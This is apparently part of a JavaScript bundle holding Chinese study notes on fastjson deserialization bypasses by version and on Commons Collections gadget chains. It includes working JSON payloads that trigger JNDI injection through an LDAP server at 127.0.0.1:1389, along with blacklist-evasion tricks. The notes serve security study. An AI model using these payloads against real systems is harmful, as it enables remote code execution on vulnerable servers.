                                      1\u3001\u7136\u540E\u4E0B\u9762\u6709\u5224\u65ADautoTypeSupport\u662F\u5426\u4E3Atrue\uFF0C\u4E0D\u4E3Atrue\u5C31\u68C0\u67E5\u9ED1\u540D\u5355\u540E\u629B\u5F02\u5E38\uFF0C\u4E3Atrue\u4F1A\u518D\u8C03\u7528\u4E00\u6B21TypeUtils.loadClass
      \u6F0F\u6D1E\u5229\u7528\u70B9\uFF1A
              1\u3001\u518D\u770BTypeUtils.loadClass()
                      \u5728TypeUtils.loadClass\u4E2D\uFF0C\u53EF\u4EE5\u770B\u5230\u5BF9 \u300A[ L ;\u300B \u8FDB\u884C\u4E86\u5904\u7406\uFF0C\u800C\u5176\u4E2D\u5728\u5904\u7406 \u300AL ;\u300B \u7684\u65F6\u5019\u5B58\u5728\u4E86\u903B\u8F91\u6F0F\u6D1E\uFF0C\u53EF\u4EE5\u5728@type\u7684\u524D\u540E\u5206\u522B\u52A0\u4E0A \u300AL ;\u300B \u6765\u8FDB\u884C\u7ED5\u8FC7

      payload\u5982\u4E0B\uFF1A
              ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //\u5F00\u542FautoTypeSupport
              {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://127.0.0.1:1389/ut3kwl","autoCommit":true}
  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.42",`
  \u7248\u672C 1.2.42
      \u5B98\u65B9\u589E\u52A0\u4E86\u9650\u5236\uFF1A
              1\u3001\u9ED1\u540D\u5355\u53D8\u6210\u4E86HashCode
                      \uFF08\u6240\u4EE5\uFF0C\u4E0D\u518D\u660E\u6587\u663E\u793A\u4E86\uFF1B\u800C\u662F\u8FDB\u884C Hash\u503C\u4E4B\u540E \u6BD4\u8F83\uFF09
                                \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u5355\u5411\u7F16\u7801\uFF0C\u4E0D\u53EF\u9006

      \u6F0F\u6D1E\u5229\u7528\u70B9\uFF1A
              1\u3001\u5728 checkAutoType() \u4E2D\u8FDB\u884C\u4E86 \u300AL;\u300B \u622A\u53D6\uFF0C\u7136\u540E\u5C31\u76F4\u63A5\u8FDB\u5165\u4E86TypeUtils.loadClass
                      \u6240\u4EE5\u6211\u4EEC\uFF0C\u524D\u540E\u53CC\u5199 \u300AL\u300B \u548C \u300A;\u300B \u5C31\u53EF\u7ED5\u8FC7

      payload\u5982\u4E0B\uFF1A
              ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //\u5F00\u542FautoTypeSupport
              {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:1389/ut3kwl","autoCommit":true}

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.43",`

  \u7248\u672C 1.2.43
      \u5B98\u65B9\u589E\u52A0\u4E86\u9650\u5236\uFF1A
              1\u3001\u6DFB\u52A0\u5224\u65AD\uFF0C\u5982\u679C\u4EE5 \u300ALL\u300B \u5F00\u5934\u76F4\u63A5\u629B\u5F02\u5E38

      \u6F0F\u6D1E\u5229\u7528\u70B9\uFF1A
              1\u3001\u53EF\u4EE5\u4F7F\u7528 TypeUtils.loadClass \u4E2D\u5BF9\u4E8E \u300A[\u300B \u7684\u5904\u7406\u6765\u7ED5\u8FC7

      payload\u5982\u4E0B\uFF1A
              ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //\u5F00\u542FautoTypeSupport
              {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://127.0.0.1:1389/ut3kwl","autoCommit":true}    // \u201C[{\u201D \u4E0D\u52A0\u4F1A\u51FA\u5F02\u5E38

              \u5907\u6CE8\uFF1A
                      \u8BE5 payload \u5728 \u300A1.2.25 <= fastjson <= 1.2.43\u300B \u90FD\u53EF\u4EE5\u4F7F\u7528\u3002
  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.45",`

  \u7248\u672C 1.2.45
      \u6F0F\u6D1E\u5229\u7528\u70B9\uFF1A
              1\u3001\u5B58\u5728\u7EC4\u4EF6\u6F0F\u6D1E\u3002\u6211\u4EEC\u9700\u8981\u501F\u52A9 MyBatis \u7EC4\u4EF6\u3002
      payload\u5982\u4E0B\uFF1A
              ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //\u5F00\u542FautoTypeSupport
              {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://127.0.0.1:1389/g0tvin"}}
  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.47",`

  \u7248\u672C 1.2.47
      \u4ECB\u7ECD\uFF1A
              \u5728\u6B64\u7248\u672C\u4E2D\u53EF\u4EE5\u5728\u4E0D\u5F00\u542F autoTypeSupport \u7684\u60C5\u51B5\u4E0B\uFF0C\u89E6\u53D1\u6F0F\u6D1E
      \u94FE\u6761\uFF1A
              1\u3001\u5728checkAutoType()\u4E2D\uFF0C\u5F53 autoTypeSupport \u4E3Afalse\u65F6\uFF0C\u4F1A\u7EE7\u7EED\u6267\u884C TypeUtils.getClassFromMapping \u548C this.deserializers.findClass \u5BFB\u627E\u7C7B\uFF0C\u5982\u679C\u627E\u5230\u4E86\u5C31\u8FD4\u56DEclazz
              2\u3001\u5728 ParserConfig \u7C7B\u521D\u59CB\u5316\u65F6\u4F1A\u6267\u884C initDeserializers \u65B9\u6CD5\uFF0C\u4F1A\u5411deserializers\u4E2D\u6DFB\u52A0\u8BB8\u591A\u7684\u7C7B\uFF0C\u7C7B\u4F3C\u4E00\u79CD\u7F13\u5B58\uFF0C
                      \u5176\u4E2D\u4F1A\u6DFB\u52A0\u8FD9\u4E48\u4E00\u4E2A\u7C7B this.deserializers.put(Class.class, MiscCodec.instance);
                              1\u3001MiscCodec\u7C7B\u4E2D\uFF0C\u6709\u4E00\u4E2A\u65B9\u6CD5 deserialize \uFF0C\u800C\u5728\u8FDB\u884Cjson\u53CD\u5E8F\u5217\u5316\u65F6\u4F1A\u8C03\u7528\u8FD9\u4E2A\u65B9\u6CD5\uFF0C
                                      1\u3001\u5728\u65B9\u6CD5\u5185\u4F1A\u5BF9clazz\u8FDB\u884C\u5224\u65AD\uFF0C\u5F53\u7C7B\u4E3AClass.class\u4E5F\u5C31\u662Fjava.lang.Class\u7C7B\u65F6\uFF0C\u4F1A\u8FDB\u5165\u5230TypeUtils.loadClass\u4E2D
                                              1\u3001\u5728TypeUtils.loadClass\u4E2D\uFF0C\u5982\u679Ccache\u4E3Atrue\u5219\u4F1A\u5C06className\u653E\u5230mapping\u4E2D\uFF0C\u5176\u4E2Dcache\u9ED8\u8BA4\u4E3Atrue
                                              2\u3001className\u4E3A\u4F20\u8FDB\u6765\u7684strVal\uFF0C\u5728 deserialize \u4E2D\uFF0CstrVal\u7531objVal\u5F3A\u5236\u8F6C\u6362\u800C\u6765
                                                        1\u3001objVal\u662F\u5728parser.parse()\u4E2D\u622A\u53D6\u800C\u6765\uFF0C\u4E14\u53C2\u6570\u540D\u5FC5\u987B\u4E3Aval\uFF0C\u5426\u5219\u4F1A\u629B\u51FA\u5F02\u5E38\uFF0C
                                                        2\u3001\u4E5F\u5C31\u662F\u8BF4\u53EF\u4EE5\u901A\u8FC7\u53CD\u5E8F\u5217\u5316\u5F80mapping\u4E2D\u6DFB\u52A0\u4EFB\u4F55\u7C7B\uFF0C
                                                                1\u3001\u8FD9\u6837\u7684\u8BDD\u6DFB\u52A0com.sun.rowset.JdbcRowSetImpl\u7C7B\uFF0C\u4ECE\u800C\u7ED5\u8FC7autoTypeSupport\u7684\u548C\u9ED1\u540D\u5355\u7684\u9650\u5236\uFF0C\u7136\u540E\u518D\u6B21\u4F20\u9012json\u53BB\u89E6\u53D1JdbcRowSetImpl\u7684JNDI\u6CE8\u5165
      payload\u5982\u4E0B:
              {
                  "1": { "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl" },
                  "2": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://127.0.0.1:1389/g0tvin", "autoCommit": true }
              }
  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.48\uFF0C\u4FEE\u590D\u4E86\u4EE5\u5F80\u7684\u5927\u90E8\u5206\u5DF2\u77E5\u5B89\u5168\u6F0F\u6D1E\u3002  \u57FA\u672C\u5DF2\u4FEE\u590D\u524D\u9762\u7684\u95EE\u9898\uFF0C\u53EA\u5B58\u5728\u300A\u9ED1\u540D\u5355\u7ED5\u8FC7\u300B",`

  \u7248\u672C 1.2.48
      \u4ECB\u7ECD\uFF1A
              \u4F5C\u8005\u8FDB\u884C\u4E86\u4FEE\u590D\u3002
                      1\u3001\u5728 MiscCodec \u4E2D\u4FEE\u6539\u4E86cache\u7684\u9ED8\u8BA4\u503C\uFF0C\u4FEE\u6539\u4E3Afalse\uFF0C
                      2\u3001\u5E76\u4E14\u5BF9 TypeUtils.loadClass \u505A\u4E86\u9650\u5236\uFF0C\u9700\u8981 cache \u4E3Atrue\uFF0C\u624D\u4F1A\u6267\u884C mapping.put \u65B9\u6CD5\u3002
      \u5F71\u54CD\uFF1A
              \u4E4B\u524D\u7684\u82E5\u5E72 \u53CD\u5E8F\u5217\u5316 \u653B\u51FB\u65B9\u6CD5\uFF0C\u5747\u5DF2\u5931\u6548\u3002

      \u9ED1\u540D\u5355\u7ED5\u8FC7\uFF1A
              `.concat(lu,`

  `),{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.48 <= fastjson < 1.2.68  \u4E3B\u8981\u662F\u300A\u9ED1\u540D\u5355\u7ED5\u8FC7\u300B",`


      \u9ED1\u540D\u5355\u7ED5\u8FC7\uFF1A
                `.concat(lu,`


  `),{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.68",`

  \u7248\u672C 1.2.68
      \u5B98\u65B9\u589E\u52A0\u4E86\u9650\u5236\uFF1A
              1\u3001\u5728\u6B64\u7248\u672C\u4E2D\u65B0\u589E\u4E86\u4E00\u4E2AsafeMode\u529F\u80FD\uFF0C
                      \u5982\u679C\u5F00\u542F\u7684\u8BDD\uFF0C\u5C06\u4F1A\u76F4\u63A5\u629B\u51FA\u5F02\u5E38\uFF0C\u5B8C\u5168\u675C\u7EDD\u4E86autoTypeSupport\u7684\u7ED5\u8FC7

      \u6F0F\u6D1E\u5229\u7528\u70B9\uFF1A
              1\u3001\u5728\u4E0D\u5F00\u542FsafeMode\u7684\u524D\u63D0\u4E0B\uFF0C\u5BF9autoTypeSupport\u7684\u7ED5\u8FC7
                      1\u3001\u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF0C\u901A\u8FC7expectClass\u8FDB\u884C\u7ED5\u8FC7\uFF0C
                              1\u3001\u5F53\u4F20\u5165\u7684expectClass\u4E0D\u5728\u9ED1\u540D\u5355\u4E2D\u540E\uFF0CexpectClassFlag\u7684\u503C\u4E3Atrue\u65F6\uFF0C\u4F1A\u8C03\u7528TypeUtils.loadClass\u52A0\u8F7D\u7C7B\uFF0C\u5176\u4E2Dclazz\u4E5F\u5C31\u662F\u4F20\u8FDB\u53BB\u7684\u53E6\u4E00\u4E2A\u7C7B\u540D\u5FC5\u987B\u4E3AexpectClass\u7684\u5B50\u7C7B
                                      1\u3001\u5176\u4E2Djava.lang.AutoCloseable\u56E0\u4E3A\u5728\u767D\u540D\u5355\u4E2D\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4F7F\u7528\u5176\u5B50\u7C7B\u6765\u8FDB\u884C\u7ED5\u8FC7autoTypeSupport
                                      2\u3001\u8FD9\u91CC\u7A0D\u5FAE\u603B\u7ED3\u4E00\u4E0B\u6076\u610F\u7C7B\u8981\u6EE1\u8DB3\u7684\u6761\u4EF6\uFF1A
                                              \u6076\u610F\u7C7B\u4E0D\u5728\u9ED1\u540D\u5355\u5185
                                              \u6076\u610F\u7C7B\u7684\u7236\u7C7B\uFF08\u4F8B\u5982AutoCloseable\uFF09\u4E0D\u5728\u9ED1\u540D\u5355\u5185
                                              \u6076\u610F\u7C7B\u4E0D\u80FD\u662F\u62BD\u8C61\u7C7B
                                              \u6076\u610F\u7C7B\u4E2D\u7684 getter/setter/static block/constructor \u80FD\u89E6\u53D1\u6076\u610F\u64CD\u4F5C

      payload\u5982\u4E0B\uFF1A
              \u5229\u7528  java.lang.Runnable\u3001java.lang.Readable\u548Cjava.lang.AutoCloseable  \u76F8\u5173\u7684\u6784\u9020\u5373\u53EF\u3002


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.80",`

  \u7248\u672C 1.2.80
      \u539F\u7406\uFF1A
              1\u3001\u7528\u7684\u5C31\u662F\u53E6\u4E00\u4E2A\u671F\u671B\u7C7B\uFF1A\u5F02\u5E38\u7C7BThrowable\u3002
              2\u3001\u7528\u7EE7\u627F\u4E86Exception\u7684MyException\u7C7B\u4F5C\u4E3Atype\u3002
                      1\u3001\u5728 com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class<?>, int) \u4E2D
                              1\u3001expectClassFlag\u4E3Atrue\uFF0C\u6240\u4EE5\u4F1A\u4ECEclassloader\u4E2D\u52A0\u8F7DMyException\u62FF\u5230class
                              2\u3001\u5E76\u4E14\u671F\u671B\u7C7B\u4E0D\u4E3A\u7A7A\u65F6\u4F1A\u628A\u76EE\u6807\u7C7B\u52A0\u5165\u5230\u7C7B\u7F13\u5B58\u4E2DTypeUtils.addMapping(typeName, clazz)
                      2\u3001\u89E3\u51B3\u5B8C\u4E24\u4E2Atype\u6807\u7B7E\u4E4B\u540E\uFF0C\u73B0\u5728\u6765\u770Bclazz\u6807\u7B7E\u7684\u89E3\u6790\u8FC7\u7A0B
                              1\u3001\u56E0\u4E3A\u662F\u5F02\u5E38\u7C7B\uFF0C\u6240\u4EE5\u5728 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) \u62FF\u5230\u7684\u662FThrowableDeserializer\u53CD\u5E8F\u5217\u5316\u5668
                                      1\u3001\u6DF1\u7A76getDeserializer\u51FD\u6570
                                              xxxxxx
                                      2\u3001\u5982\u679C\u662Ftype\u4F20\u5165\u7684\u662FClass\u5219\u8FDB\u5165com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class<?>, java.lang.reflect.Type)
                                              1\u3001\u8FD9\u4E2A\u51FD\u6570\u4E2D\u4F1A\u9488\u5BF9\u4E0D\u540C\u7C7B\u7684class\u7C7B\u578B\u5206\u914D\u76F8\u5E94\u7684\u53CD\u5E8F\u5217\u5316\u5668
                                              2\u3001\u5E76\u4E14\u6700\u7EC8\u90FD\u4F1A\u5C06 type \u548C deserializer \u7684\u5BF9\u5E94\u5173\u7CFB\uFF0Cput\u5230\u81EA\u8EAB\u7684 deserializers map \u4E2D\u3002\u2014\u2014\u2014\u2014\u2014\u2014 com.alibaba.fastjson.parser.ParserConfig#putDeserializer
                                      3\u3001\u62FF\u5230\u5BF9\u5E94\u7684 \u53CD\u5E8F\u5217\u5316\u5668 \u4E4B\u540E\uFF0C\u8FDB\u5165 com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze
                                              1\u3001\u5148 createException \u901A\u8FC7\u6784\u9020\u51FD\u6570\u521B\u5EFA\u5F02\u5E38\u5B9E\u4F8B\uFF0C\u7136\u540E\u901A\u8FC7 getDeserializer \u62FF\u5230\u5BF9\u5E94\u7684\u53CD\u5E8F\u5217\u5316\u5668\uFF0C\u7136\u540E\u7528\u53CD\u5E8F\u5217\u5316\u5668\u62FF\u5230\u5BF9\u5E94\u5B57\u6BB5\u7684\u5B57\u6BB5\u53CD\u5E8F\u5217\u5316\u5B9E\u4F8B FieldDeserializer
                                              2\u3001\u5982\u679Cvalue\u4E0D\u662FfieldClass\u7C7B\u578B\u7684\u4F1A\u8FDB\u5165 com.alibaba.fastjson.util.TypeUtils#cast(java.lang.Object, java.lang.reflect.Type, com.alibaba.fastjson.parser.ParserConfig) \u8FDB\u884C\u7C7B\u578B\u8F6C\u6362
                                              3\u3001\u591A\u6B21\u5224\u65AD\u4E4B\u540E\u4F1A\u8FDB\u5165 com.alibaba.fastjson.util.TypeUtils#cast(java.lang.Object, java.lang.Class<T>, com.alibaba.fastjson.parser.ParserConfig) \u65B9\u6CD5
                                                      1\u3001\u5728\u8FD9\u4E2A\u51FD\u6570\u4E2D\u4F1A\u6839\u636E\u4F20\u5165\u5BF9\u8C61\u7684\u5177\u4F53\u7C7B\u578B\u6765\u8FDB\u884C\u5BF9\u5E94\u7684\u7C7B\u578B\u8F6C\u6362\u64CD\u4F5C
                                                              1\u3001\u56E0\u4E3A\u6211\u4EEC\u4F20\u5165\u7684\u662F "clazz":{} \u4E5F\u5C31\u662F\u4E00\u4E2AJSONObject\uFF0C\u6240\u4EE5\u8D70\u5230Map\u7684\u7C7B\u578B\u8F6C\u6362\uFF0C\u8FDB\u5165 com.alibaba.fastjson.util.TypeUtils#castToJavaBean(java.util.Map<java.lang.String,java.lang.Object>, java.lang.Class<T>, com.alibaba.fastjson.parser.ParserConfig) \u65B9\u6CD5
                                                                      1\u3001\u5728\u8FD9\u91CC\u53C8\u4E00\u6B21\u8FDB\u5165getDeserializer\uFF0C\u800C\u6B64\u65F6\u53C2\u6570\u662FMyException\u7C7Bclazz\u5B57\u6BB5\u7684\u7C7B\u578B\uFF0C\u5373MyClass\u3002
                                                                      2\u3001\u90A3\u4E48\u91CD\u70B9\u6765\u4E86\uFF0C\u6B64\u65F6\u5728com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class<?>, java.lang.reflect.Type)\u51FD\u6570\u4E2D
                                                                              xxxxxx
                                                                              1\u3001\u8C03\u7528\u81EA\u8EABputDeserializer\u51FD\u6570\uFF0C\u586B\u5145ParserConfig\u81EA\u8EAB\u7684this.deserializers.put(type, deserializer)
                                                                              2\u3001\u800C\u5728 com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class<?>, int) \u4E2D
                                                                                      xxxxxx
                                                                              3\u3001\u5728\u53CD\u5E8F\u5217\u5316json\u4E2D\u7684 \u300Ab\u300B \u6807\u7B7E\u65F6\uFF0C\u5BF9 "@type":"MyClass" \u8FDB\u884C checkAutoType \u65F6\u5C31\u80FD\u62FF\u5230 MyClass \u7C7B\u800C\u4E0D\u4F1A\u629B\u51FA\u5F02\u5E38\u4E86\u3002
              3\u3001\u5230\u6B64\u5206\u6790\u7ED3\u675F\u3002\u634B\u4E00\u4E0B\u601D\u8DEF\uFF0C
                      1\u3001\u6839\u636E\u5F02\u5E38\u7C7B\u4F5C\u4E3A\u671F\u671B\u7C7B\u65F6\uFF0C\u4F1A\u5148\u7528\u6784\u9020\u51FD\u6570\u521B\u5EFA\u51FAMyException\u5B9E\u4F8B\uFF0C\u7136\u540E\u7ED1\u5B9A\u5BF9\u5E94\u5B57\u6BB5\uFF0C\u8C03\u7528setter\u3002
                              1\u3001\u800C\u5B57\u6BB5\u7C7B\u578BMyClass\u5728\u8FDB\u5165getDeserializer\u51FD\u6570\u65F6\u4F1A\u88ABput\u5230ParserConfig\u7684deserializers\u5217\u8868\u4E2D\uFF0C\u8FD9\u6837\u9020\u6210\u5728checkautotype\u65F6\u53EF\u4EE5\u901A\u8FC7deserializers\u62FF\u5230\u5BF9\u5E94\u7684MyClass\u7C7B\u800C\u4E0D\u4F1A\u4E3Anull\u3002
                      2\u3001\u7C7B\u5B57\u6BB5\u5982\u6B64\uFF0C\u6784\u9020\u51FD\u6570\u7684\u53C2\u6570\u548Csetter\u7684\u53C2\u6570\u5E94\u8BE5\u4E5F\u662F\u5927\u5DEE\u4E0D\u5DEE\u3002

      \u6F0F\u6D1E\u5229\u7528\u70B9\uFF1A
              1\u3001\u5728\u4E0D\u5F00\u542FsafeMode\u7684\u524D\u63D0\u4E0B\uFF0C\u5BF9autoTypeSupport\u7684\u7ED5\u8FC7
                      1\u3001\u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF0C\u901A\u8FC7expectClass\u8FDB\u884C\u7ED5\u8FC7\uFF0C
                              1\u3001\u5F53\u4F20\u5165\u7684expectClass\u4E0D\u5728\u9ED1\u540D\u5355\u4E2D\u540E\uFF0CexpectClassFlag\u7684\u503C\u4E3Atrue\u65F6\uFF0C\u4F1A\u8C03\u7528TypeUtils.loadClass\u52A0\u8F7D\u7C7B\uFF0C\u5176\u4E2Dclazz\u4E5F\u5C31\u662F\u4F20\u8FDB\u53BB\u7684\u53E6\u4E00\u4E2A\u7C7B\u540D\u5FC5\u987B\u4E3AexpectClass\u7684\u5B50\u7C7B
                                      1\u3001\u5176\u4E2Djava.lang.AutoCloseable\u56E0\u4E3A\u5728\u767D\u540D\u5355\u4E2D\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4F7F\u7528\u5176\u5B50\u7C7B\u6765\u8FDB\u884C\u7ED5\u8FC7autoTypeSupport
                                      2\u3001\u8FD9\u91CC\u7A0D\u5FAE\u603B\u7ED3\u4E00\u4E0B\u6076\u610F\u7C7B\u8981\u6EE1\u8DB3\u7684\u6761\u4EF6\uFF1A
                                              \u6076\u610F\u7C7B\u4E0D\u5728\u9ED1\u540D\u5355\u5185
                                              \u6076\u610F\u7C7B\u7684\u7236\u7C7B\uFF08\u4F8B\u5982AutoCloseable\uFF09\u4E0D\u5728\u9ED1\u540D\u5355\u5185
                                              \u6076\u610F\u7C7B\u4E0D\u80FD\u662F\u62BD\u8C61\u7C7B
                                              \u6076\u610F\u7C7B\u4E2D\u7684 getter/setter/static block/constructor \u80FD\u89E6\u53D1\u6076\u610F\u64CD\u4F5C


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0})],cu=[Object(u.c)("\u539F\u7406\u7B80\u4ECB________Transformer\u63A5\u53E3________LazyMap\u7C7B________TemplatesImpl\u7C7B",`

  Transformer\u63A5\u53E3\uFF0C\u7684\u5B9E\u73B0\u7C7B    \uFF08\u7ECF\u5E38\u7528\u5230\u7684 \u975E\u5E38\u91CD\u8981 \u7684\uFF09
      1\u3001ConstantTransformer
              1\u3001\u8FD9\u662F Transformer \u63A5\u53E3\u7684\u5B9E\u73B0\u7C7B\uFF0C\u5E76\u91CD\u5199\u4E86\u5176\u63A5\u53E3\u7C7B\u7684 transform \u65B9\u6CD5\u3002
                      \u5176 transform \u65B9\u6CD5\u4F5C\u7528\u662F\u83B7\u53D6\u4E00\u4E2A\u5BF9\u8C61\u7C7B\u578B\uFF0C\u5173\u952E\u4EE3\u7801\u5982\u4E0B\uFF1A
                              xxxxxx

      2\u3001InvokerTransformer
              1\u3001\u8FD9\u662F Transformer \u63A5\u53E3\u7684\u5B9E\u73B0\u7C7B\uFF0C\u5E76\u91CD\u5199\u4E86\u5176\u63A5\u53E3\u7C7B\u7684 transform \u65B9\u6CD5\u3002
                      \u5176 transform \u65B9\u6CD5\u4F5C\u7528\u662F\u53CD\u5C04\u8C03\u7528\u6307\u5B9A\u7684\u65B9\u6CD5\u5E76\u8FD4\u56DE\u65B9\u6CD5\u8C03\u7528\u7ED3\u679C\uFF0C\u5173\u952E\u4EE3\u7801\u5982\u4E0B\uFF1A
                              xxxxxx

      3\u3001InstantiateTransformer
              1\u3001\u8FD9\u662F Transformer \u63A5\u53E3\u7684\u5B9E\u73B0\u7C7B\uFF0C\u5E76\u91CD\u5199\u4E86\u5176\u63A5\u53E3\u7C7B\u7684 transform \u65B9\u6CD5\u3002
                      \u5176 transform \u65B9\u6CD5\u4F5C\u7528\u662F\u53CD\u5C04\u8C03\u7528\u6784\u9020\u51FD\u6570\u5C06\u7C7B\u5B9E\u4F8B\u5316\uFF0C\u5173\u952E\u4EE3\u7801\u5982\u4E0B\uFF1A
                              xxxxxx

      4\u3001ChainedTransformer
              1\u3001\u8FD9\u662F Transformer \u63A5\u53E3\u7684\u5B9E\u73B0\u7C7B\uFF0C\u5E76\u91CD\u5199\u4E86\u5176\u63A5\u53E3\u7C7B\u7684 transformer \u65B9\u6CD5\u3002
                      \u5176 transform \u65B9\u6CD5\u4F5C\u7528\u662F\u5B9E\u73B0\u6570\u7EC4\u94FE\u5F0F\u8C03\u7528\u3002
                              1\u3001\u6211\u4EEC\u53EA\u9700\u4F20\u5165\u4E00\u4E2A Transformer[] \u7ED9 ChainedTransformer\uFF0C
                                      1\u3001\u7136\u540E\u6267\u884C ChainedTransformer \u7684 transform \u65B9\u6CD5\u4FBF\u53EF\u4EE5\u94FE\u5F0F\u8C03\u7528 Transformer[] \u4E2D\u6BCF\u4E2A Transformer \u7684 transform \u65B9\u6CD5\u3002
                                      2\u3001\u5173\u952E\u4EE3\u7801\u5982\u4E0B\uFF1A
                                              xxxxxx
              2\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      xxxxxx
                      2\u3001\u300A\u5F88\u91CD\u8981\u300B\uFF1A    \u5229\u7528 ChainedTransformer \u5B9E\u73B0 Runtime.getRuntime().exec("calc")

  LazyMap \u7C7B       \uFF08\u7528\u6765\uFF0C\u89E6\u53D1 ChainedTransformer \u7684 transform \u65B9\u6CD5\uFF09
      1\u3001\u5176 get \u65B9\u6CD5\u4E2D\u53EF\u4EE5\u89E6\u53D1 ChainedTransformer \u7684 transform \u65B9\u6CD5\u3002
              xxxxxx

  TemplatesImpl     \uFF08\u501F\u52A9\u5176\u52A8\u6001\u52A0\u8F7D\u5305\u542B\u6076\u610F\u7684\u5B57\u8282\u7801\uFF09
      1\u3001\u8FD9\u4E2A\u7C7B\u4E0D\u5728 Apache Commons Collections \u4E2D\u3002
              1\u3001\u4F46\u662F TemplatesImpl \u8FD9\u4E2A\u7C7B\u5F88\u7279\u6B8A\uFF0C\u6211\u4EEC\u53EF\u4EE5\u501F\u52A9\u5176\u52A8\u6001\u52A0\u8F7D\u5305\u542B\u6076\u610F\u7684\u5B57\u8282\u7801\uFF0C
                      1\u3001\u90E8\u5206\u7B80\u5316\u4EE3\u7801\u5982\u4E0B\uFF1A
                              xxxxxx
                      2\u3001\u6076\u610F\u5B57\u8282\u7801\u7684\u751F\u6210\uFF1A
                              1\u3001HelloTemplatesImpl.java\uFF0C\u4E3B\u8981\u5176\u5FC5\u987B\u7EE7\u627F AbstractTranslet \u7C7B\uFF0C
                                      xxxxxx
                              2\u3001\u6211\u4EEC\u5C06\u5176\u7F16\u8BD1\u4E3A HelloTemplatesImpl.class\uFF0C\u7136\u540E\u8FDB\u884C Base64 \u7F16\u7801\uFF0C\u5F97\u5230\u5982\u4E0B\u7ED3\u679C\uFF1A
                                      xxxxxx
                              3\u3001\u6D4B\u8BD5 TemplatesImpl \uFF1A
                                      xxxxxx
                              4\u3001\u6240\u4EE5\u6211\u4EEC\u53EA\u9700\u4F20\u5165\u6076\u610F\u5B57\u8282\u7801\u7ED9 TemplatesImpl\uFF0C\u7136\u540E\u8C03\u7528\u5176 newTransformer \u65B9\u6CD5\u3002
                                      1\u3001\u90A3\u4E48\u6709\u6CA1\u6709\u7C7B\u53EF\u4EE5\u8C03\u7528 TemplatesImpl.newTransformer()\u5462\uFF1F
                                      2\u3001\u8FD9\u91CC\u5148\u4ECB\u7ECD\u4E00\u4E2A\u6784\u9020 CC3 \u4E2D\u5C06\u4F1A\u7528\u5230\u7684\u7C7B TrAXFilter\uFF0C\u4E0B\u9762\u662F\u5176\u6784\u9020\u51FD\u6570\uFF1A
                                              xxxxxx
                                      3\u3001\u6D4B\u8BD5 TrAXFilter\uFF1A
                                              xxxxxx



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u5F88\u591A\u79CDCC\u94FE________CC1 \u5230 CC7",`


  CC\u94FE\uFF0C\uFF08\u51E0\u79CD\u89E6\u53D1 LazyMap#get \u7684\u65B9\u6CD5\uFF09

      1\u3001CC1
              1\u3001\u901A\u8FC7 AnnotationInvocationHandler \u7C7B\u89E6\u53D1 LazyMap \u7684 get \u65B9\u6CD5\u3002
              2\u3001\u7B80\u5316\u7248 AnnotationInvocationHandler \u7C7B\u7684\u4EE3\u7801\uFF1A
                      xxxxxx
              3\u3001AnnotationInvocationHandler \u7C7B \u7684 readObject \u65B9\u6CD5\u4EE3\u7801\uFF1A
                      1\u3001\u5173\u952E\u70B9\u5728 this.memberValues.entrySet() \uFF0C\u8FD9\u91CC\u6211\u4EEC\u53EF\u4EE5\u4E3A memberValues \u4F20\u5165\u4E00\u4E2A\u4EE3\u7406\u5BF9\u8C61\u3002
                      2\u3001\u901A\u8FC7 java \u7684\u52A8\u6001\u4EE3\u7406\u673A\u5236\uFF0C\u4F7F\u5176\u6700\u7EC8\u89E6\u53D1 AnnotationInvocationHandler \u7C7B\u7684 invoke \u65B9\u6CD5\uFF0C\u4ECE\u800C\u5B9E\u73B0\u89E6\u53D1 LazyMap.get()\u3002

              4\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      3.1-3.2.1 jdk\u7248\u672C\u5C0F\u4E8Eu71
              5\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      ->AnnotationInvocationHandler.readObject()
                            ->mapProxy.entrySet().iterator()  //\u52A8\u6001\u4EE3\u7406\u7C7B
                                ->AnnotationInvocationHandler.invoke()
                                  ->LazyMap.get()
